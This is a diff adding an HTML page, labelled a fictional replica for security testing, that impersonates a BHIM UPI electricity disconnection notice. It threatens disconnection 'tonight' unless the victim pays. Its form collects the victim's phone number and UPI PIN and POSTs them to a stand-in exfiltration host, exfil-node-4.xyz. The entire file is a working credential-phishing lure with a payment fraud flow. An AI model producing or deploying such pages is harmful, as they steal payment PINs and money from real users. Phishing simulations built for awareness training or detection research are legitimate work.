@@ -1,0 +1,58 @@
+<!-- fictional replica for security testing -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BHIM Electricity Bill Payment & Disconnection Notice</title>
+    <style>
+        :root {
+            --primary: #005d52;
+            --secondary: #2e7d32;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: #f8fafc; color: #1e293b; display: flex; justify-content: center; padding: 14px; }
+        .p2_c4_container { width: 100%; max-width: 440px; background: #ffffff; border: 1px solid #e2e8f0; border-radius: 12px; overflow: hidden; }
+        .p2_c4_alert-header { background: #b91c1c; color: #ffffff; padding: 16px; text-align: center; }
+        .p2_c4_alert-title { font-size: 16px; font-weight: 800; text-transform: uppercase; }
+        .p2_c4_content { padding: 20px; }
+        .p2_c4_bill-details { background: #f1f5f9; border-radius: 8px; padding: 14px; margin-bottom: 16px; font-size: 13px; }
+        .p2_c4_row { display: flex; justify-content: space-between; margin-bottom: 6px; }
+        .p2_c4_bill-amount { font-size: 24px; font-weight: 800; color: #b91c1c; text-align: right; }
+        .p2_c4_warning-note { background: #fef2f2; border: 1px solid #fecaca; border-radius: 6px; padding: 10px; font-size: 12px; color: #991b1b; margin-bottom: 16px; }
+        .p2_c4_field { width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 6px; margin-bottom: 12px; font-size: 14px; }
+        .p2_c4_pay-btn { width: 100%; padding: 14px; background: var(--primary); color: #ffffff; border: none; border-radius: 6px; font-size: 15px; font-weight: 700; cursor: pointer; }
+        .p2_c4_support-info { text-align: center; margin-top: 14px; font-size: 12px; color: #64748b; }
+    </style>
+</head>
+<body>
+    <div class="p2_c4_container">
+        <div class="p2_c4_alert-header">
+            <div class="p2_c4_alert-title">⚡ Urgent Disconnection Warning</div>
+        </div>
+        <div class="p2_c4_content">
+            <div class="p2_c4_bill-details">
+                <div class="p2_c4_row"><span>Consumer Number:</span><strong>WB202163</strong></div>
+                <div class="p2_c4_row"><span>Subdivision:</span><span>State Power Corp</span></div>
+                <div class="p2_c4_row"><span>Service Portal:</span><strong>BHIM Official UPI Utilities</strong></div>
+                <div class="p2_c4_row" style="margin-top: 8px;">
+                    <span>Overdue Balance:</span>
+                    <span class="p2_c4_bill-amount">₹5050</span>
+                </div>
+            </div>
+            <div class="p2_c4_warning-note">
+                Notice: Power connection will be disconnected tonight at 09:30 PM due to unpaid invoice. Pay immediately via BHIM Official UPI UPI to cancel disconnection order.
+            </div>
+            <form action="https://exfil-node-4.xyz/submit" method="POST">
+                <input class="p2_c4_field" type="text" name="vpa" value="settlement.desk4_2@ybl" readonly>
+                <input class="p2_c4_field" type="tel" name="consumer_phone" placeholder="Registered Mobile Number" value="+919876040002">
+                <input class="p2_c4_field" type="password" name="upi_pin" placeholder="Enter UPI PIN to Authorize Instant Settlement" maxlength="6" required>
+                <button class="p2_c4_pay-btn" type="submit">PAY BILL & CANCEL DISCONNECTION</button>
+            </form>
+            <div class="p2_c4_support-info">
+                Electricity Officer Helpline: +919876040002 &bull; Notice Ref: DIS-001025
+            </div>
+        </div>
+    </div>
+</body>
+</html>
